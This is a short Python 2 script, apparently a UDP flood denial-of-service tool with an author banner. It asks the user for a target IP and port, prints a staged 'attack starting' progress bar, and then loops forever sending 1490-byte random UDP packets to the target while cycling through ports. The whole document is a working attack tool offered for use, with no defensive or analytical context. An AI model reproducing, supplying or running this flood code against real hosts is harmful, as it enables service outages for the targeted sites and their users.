#!/usr/bin/env python

##imports##
import sys
import os
import time
import socket
import random
##code time##
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##### SETTING BYTES #####
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##########################

os.system("clear")
os.system("figlet DDOS")
print
print "Author:  KrishPranav"
print "github:  https://github.com/krishpranav"
print "twitter: https://www.twitter.com/krishpranav5"
print
targetip = raw_input("Enter Your Target Website IP: ")
port = input("Port To Attack: ")

os.system("clear")
os.system("figlet Attack Starting..")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (targetip,port))
    sent = sent + 1
    port = port + 1
    print "Sent %s packet to %s throught port:%s"%(sent,targetip,port)
    if port == 65534:
        port = 1
